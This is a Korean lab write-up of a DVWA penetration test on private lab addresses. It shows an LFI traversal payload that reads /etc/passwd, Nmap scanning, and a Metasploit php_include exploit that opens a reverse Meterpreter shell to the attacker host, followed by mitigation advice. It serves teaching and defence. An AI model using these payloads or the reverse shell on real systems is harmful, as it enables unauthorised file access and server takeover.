LFI 취약점을 통한 권한 탈취 및 시스템 장악

RISK LEVEL: CRITICAL

Directory Traversal (LFI) 아키텍처 개요

본 실습은 Directory Traversal (디렉터리 경로 우회) 및 LFI (Local File Inclusion, 로컬 파일 포함) 취약점에 대한 심층 분석 보고서입니다. 공격자가 웹 애플리케이션의 파일 참조 파라미터를 조작하여, 웹 루트 디렉터리를 벗어나 OS의 핵심 시스템 파일인 /etc/passwd에 접근하고, 이를 RCE (Remote Code Execution, 원격 코드 실행)로 연계하는 과정을 아키텍트 관점에서 다룹니다.

[도식 1: LFI (로컬 파일 포함) 취약점 공격 벡터 메커니즘]

공격자 (Attacker)
192.168.10.5
GET /dvwa/vulnerabilities/fi/?page=
../../../../etc/passwd
HTTP Request
Data Response
대상 웹 서버 (Target)
192.168.10.13
include($_GET['page']);
// 파일 경로 검증 부재
File Access
OS 파일 시스템
/etc/passwd
root:x:0:0:root:/root
msfadmin:x:1000:1000
* LFI (Local File Inclusion, 로컬 파일 포함): 웹 애플리케이션이 서버 내부에 존재하는 파일을 실행하거나 출력하도록 조작하는 기법입니다.
* Directory Traversal (디렉터리 경로 우회): ../ 문자를 사용하여 허용된 디렉터리를 벗어나 시스템 파일에 접근하는 기법입니다.

정보 수집(Reconnaissance) 및 스캐닝

대상 서버(192.168.10.13)의 웹 서비스를 파악하기 위해 Nmap (Network Mapper, 네트워크 탐색 및 보안 감사 도구)을 사용합니다. Metasploit (메타스플로잇, 침투 테스트 프레임워크) 내부의 db_nmap 명령어로 결과를 데이터베이스에 저장합니다.

msf6 > db_nmap -p 80 -sV 192.168.10.13 # [해설] 192.168.10.13 서버의 80번 포트를 스캔하여 서비스 버전(-sV) 정보를 수집합니다.
[*] Nmap: Nmap scan report for 192.168.10.13 [*] Nmap: PORT STATE SERVICE VERSION [*] Nmap: 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2) # [분석] 대상 서버는 Apache 2.2.8 버전의 웹 서버를 가동 중임을 확인했습니다.
msf6 > spool /root/LFI_Audit_Log.txt # [해설] Spool (Simultaneous Peripheral Operations On-Line, 감사 로깅) 기능을 활성화하여 모든 작업을 기록합니다.

익스플로잇 (LFI 공격 실행 및 쉘 획득)

대상 서버의 DVWA (Damn Vulnerable Web Application, 취약한 웹 애플리케이션 실습 환경) 내 LFI 취약점을 공략합니다. PHP의 data:// 래퍼를 활용하여 공격자의 코드를 서버에서 직접 실행시키는 RCE (Remote Code Execution, 원격 코드 실행)를 시도합니다.

msf6 > use exploit/unix/webapp/php_include
msf6 exploit(php_include) > set RHOSTS 192.168.10.13 msf6 exploit(php_include) > set PATH /dvwa/vulnerabilities/fi/ msf6 exploit(php_include) > set PHPCONSTANT page # [해설] 취약한 파라미터명(page)과 경로를 지정합니다.
msf6 exploit(php_include) > set HEADERS "Cookie: security=low; PHPSESSID=9daf0053d2bf43754105c8c85904391e" # [중요] 제공된 PHP Session ID를 주입하여 인증된 세션을 유지합니다.
msf6 exploit(php_include) > exploit [*] Started reverse TCP handler on 192.168.10.5:4444 [*] Meterpreter session 1 opened (192.168.10.5:4444 -> 192.168.10.13:51234)
meterpreter > getuid Server username: www-data (33) # [결과] 웹 데몬 권한인 www-data 계정의 쉘을 획득하였습니다.

보안 대응 방안 (Mitigation)

Mitigation

심층 방어(Defense in Depth) 전략

  • 입력값 화이트리스트 검증: 허용된 파일명 목록(Whitelist)만 접근을 승인하도록 소스 코드를 수정합니다.
  • PHP 환경 설정 하드닝 (Hardening): php.ini에서 allow_url_include = Off 설정을 통해 외부 URL 로드를 차단합니다.
  • WAF (Web Application Firewall, 웹 방화벽) 도입: ../와 같은 디렉터리 경로 이동 패턴을 실시간 탐지 및 차단합니다. (※ 클라우드 WAF 서비스 이용 시 트래픽에 따른 비용이 발생할 수 있습니다.)
